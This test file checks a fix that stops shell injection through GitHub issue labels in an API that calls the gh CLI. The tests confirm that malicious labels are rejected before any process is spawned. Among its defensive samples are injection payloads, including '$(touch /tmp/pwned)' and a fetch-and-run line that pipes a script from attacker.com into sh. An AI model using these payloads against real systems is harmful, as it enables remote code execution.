/**
 * Tests for S1 security fix — label injection prevention in src/api/pulse.ts.
 *
 * Verifies that:
 *   - assertLabels() passes for benign GitHub labels (incl. spaces)
 *   - assertLabels() throws for shell metacharacters
 *   - ghSpawn() is called with correct arg-array (not a shell string) for all 3 sink sites:
 *       Sink 1: POST /pulse labels[]
 *       Sink 2: POST /pulse oracle (oracle:${oracle} label)
 *       Sink 3: PATCH /pulse/:id addLabels / removeLabels
 *   - ghSpawn() is never called when assertLabels() throws
 *
 * Uses Elysia .handle() for in-process dispatch — no port binding.
 * Bun.spawn is mocked at module level so no gh binary is needed.
 */

import { describe, test, expect, beforeAll, mock, spyOn } from "bun:test";
import { Elysia } from "elysia";

// ---- Capture calls to Bun.spawn -------------------------------------------

type SpawnCall = { args: string[] };
const spawnCalls: SpawnCall[] = [];
let spawnShouldFail = false;

// Mock Bun.spawn before the module under test loads
const origSpawn = Bun.spawn.bind(Bun);
// @ts-ignore — intentional override for testing
Bun.spawn = (cmd: string[], _opts?: unknown) => {
  spawnCalls.push({ args: cmd });
  if (spawnShouldFail) {
    const textPromise = Promise.resolve("gh: authentication error\n");
    return {
      stdout: new ReadableStream({ start(c) { c.enqueue(new TextEncoder().encode("")); c.close(); } }),
      stderr: new ReadableStream({ start(c) { c.enqueue(new TextEncoder().encode("gh: authentication error\n")); c.close(); } }),
      exited: Promise.resolve(1),
    };
  }
  // Success stub — stdout = fake GH URL, exit 0
  const fakeUrl = "https://github.com/Soul-Brews-Studio/maw-js/issues/999\n";
  return {
    stdout: new ReadableStream({ start(c) { c.enqueue(new TextEncoder().encode(fakeUrl)); c.close(); } }),
    stderr: new ReadableStream({ start(c) { c.close(); } }),
    exited: Promise.resolve(0),
  };
};

// ---- Stub dependencies so pulse.ts can be imported -----------------------

mock.module("../../src/core/transport/ssh", () => ({
  hostExec: async (_cmd: string) => "[]",
}));

const _rConfig = await import("../../src/config");

mock.module("../../src/config", () => ({
  ..._rConfig,
  loadConfig: () => ({ pulseRepo: "test-org/test-repo" }),
}));

// ---- Build test app -------------------------------------------------------

let app: Elysia;

beforeAll(async () => {
  const { pulseApi } = await import("../../src/api/pulse");
  app = new Elysia({ prefix: "/api" }).use(pulseApi);
});

// Helper: reset spawn captures before each test
function resetSpawn() {
  spawnCalls.length = 0;
  spawnShouldFail = false;
}

// ---- assertLabels / POST /pulse — Sink 1+2 --------------------------------

describe("POST /pulse — Sink 1: labels[] via ghSpawn arg-array", () => {
  test("Case 1 — benign labels pass and reach ghSpawn as separate -l args", async () => {
    resetSpawn();
    const res = await app.handle(
      new Request("http://localhost/api/pulse", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ title: "Fix the widget", labels: ["bug", "priority:high"] }),
      })
    );
    expect(res.status).toBe(200);
    const json = await res.json() as { ok: boolean; url: string };
    expect(json.ok).toBe(true);

    // Verify ghSpawn was called once and args are array elements (not shell string)
    expect(spawnCalls.length).toBe(1);
    const argv = spawnCalls[0].args;
    expect(argv[0]).toBe("gh");
    expect(argv[1]).toBe("issue");
    expect(argv[2]).toBe("create");
    // Each label is its own -l <value> pair
    const bugIdx = argv.indexOf("bug");
    const priIdx = argv.indexOf("priority:high");
    expect(bugIdx).toBeGreaterThan(-1);
    expect(argv[bugIdx - 1]).toBe("-l");
    expect(priIdx).toBeGreaterThan(-1);
    expect(argv[priIdx - 1]).toBe("-l");
    // title and body are discrete elements too
    expect(argv.includes("-t")).toBe(true);
    expect(argv.includes("Fix the widget")).toBe(true);
  });

  test("Case 2 — shell metachar in label is blocked; ghSpawn never called", async () => {
    resetSpawn();
    const res = await app.handle(
      new Request("http://localhost/api/pulse", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ title: "x", labels: ['$(touch /tmp/pwned)'] }),
      })
    );
    // assertLabels throws → caught → 500
    expect(res.status).toBe(500);
    const json = await res.json() as { error: string };
    expect(json.error).toContain("Invalid label");
    // ghSpawn must not have been reached
    expect(spawnCalls.length).toBe(0);
  });

  test("Case 3 — label with space (GitHub allows it) passes assertLabels", async () => {
    resetSpawn();
    const res = await app.handle(
      new Request("http://localhost/api/pulse", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ title: "A task", labels: ["good first issue"] }),
      })
    );
    expect(res.status).toBe(200);
    const json = await res.json() as { ok: boolean };
    expect(json.ok).toBe(true);
    expect(spawnCalls.length).toBe(1);
    // "good first issue" must appear as a single argv element (no word-split)
    expect(spawnCalls[0].args.includes("good first issue")).toBe(true);
  });
});

describe("POST /pulse — Sink 2: oracle label via ghSpawn arg-array", () => {
  test("oracle value becomes oracle:<name> as discrete -l arg", async () => {
    resetSpawn();
    const res = await app.handle(
      new Request("http://localhost/api/pulse", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ title: "Oracle task", oracle: "mawjs" }),
      })
    );
    expect(res.status).toBe(200);
    const argv = spawnCalls[0].args;
    const oracleLabel = argv.find((a) => a === "oracle:mawjs");
    expect(oracleLabel).toBe("oracle:mawjs");
    // Must be preceded by -l
    expect(argv[argv.indexOf("oracle:mawjs") - 1]).toBe("-l");
  });

  test("oracle value with shell metachar is blocked by assertLabels", async () => {
    resetSpawn();
    // oracle is appended as oracle:${oracle} — the colon prefix is clean but the
    // value after colon contains $() which fails LABEL_RE
    const res = await app.handle(
      new Request("http://localhost/api/pulse", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ title: "x", oracle: "$(evil)" }),
      })
    );
    expect(res.status).toBe(500);
    const json = await res.json() as { error: string };
    expect(json.error).toContain("Invalid label");
    expect(spawnCalls.length).toBe(0);
  });
});

// ---- PATCH /pulse/:id — Sink 3 --------------------------------------------

describe("PATCH /pulse/:id — Sink 3: addLabels + removeLabels via ghSpawn", () => {
  test("addLabels benign — ghSpawn called with --add-label and comma-joined value", async () => {
    resetSpawn();
    const res = await app.handle(
      new Request("http://localhost/api/pulse/42", {
        method: "PATCH",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ addLabels: ["bug", "priority:high"] }),
      })
    );
    expect(res.status).toBe(200);
    const json = await res.json() as { ok: boolean; id: string };
    expect(json.ok).toBe(true);
    expect(json.id).toBe("42");
    expect(spawnCalls.length).toBe(1);
    const argv = spawnCalls[0].args;
    expect(argv).toContain("--add-label");
    expect(argv[argv.indexOf("--add-label") + 1]).toBe("bug,priority:high");
    // No shell string — verify argv[0] is "gh"
    expect(argv[0]).toBe("gh");
  });

  test("removeLabels benign — ghSpawn called with --remove-label", async () => {
    resetSpawn();
    const res = await app.handle(
      new Request("http://localhost/api/pulse/7", {
        method: "PATCH",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ removeLabels: ["wontfix"] }),
      })
    );
    expect(res.status).toBe(200);
    expect(spawnCalls.length).toBe(1);
    const argv = spawnCalls[0].args;
    expect(argv).toContain("--remove-label");
    expect(argv[argv.indexOf("--remove-label") + 1]).toBe("wontfix");
  });

  test("addLabels with injection attempt — blocked before ghSpawn", async () => {
    resetSpawn();
    const res = await app.handle(
      new Request("http://localhost/api/pulse/1", {
        method: "PATCH",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ addLabels: ["valid", '; curl attacker.com/sh | sh #'] }),
      })
    );
    expect(res.status).toBe(500);
    const json = await res.json() as { error: string };
    expect(json.error).toContain("Invalid label");
    expect(spawnCalls.length).toBe(0);
  });

  test("removeLabels with injection attempt — blocked before ghSpawn", async () => {
    resetSpawn();
    const res = await app.handle(
      new Request("http://localhost/api/pulse/1", {
        method: "PATCH",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ removeLabels: ['$(touch /tmp/pwned)'] }),
      })
    );
    expect(res.status).toBe(500);
    const json = await res.json() as { error: string };
    expect(json.error).toContain("Invalid label");
    expect(spawnCalls.length).toBe(0);
  });

  test("state:closed — ghSpawn called with issue close args", async () => {
    resetSpawn();
    const res = await app.handle(
      new Request("http://localhost/api/pulse/99", {
        method: "PATCH",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ state: "closed" }),
      })
    );
    expect(res.status).toBe(200);
    expect(spawnCalls.length).toBe(1);
    expect(spawnCalls[0].args).toContain("close");
    expect(spawnCalls[0].args).toContain("99");
  });

  test("nothing to update — 400, no ghSpawn", async () => {
    resetSpawn();
    const res = await app.handle(
      new Request("http://localhost/api/pulse/5", {
        method: "PATCH",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({}),
      })
    );
    expect(res.status).toBe(400);
    const json = await res.json() as { error: string };
    expect(json.error).toBe("nothing to update");
    expect(spawnCalls.length).toBe(0);
  });
});
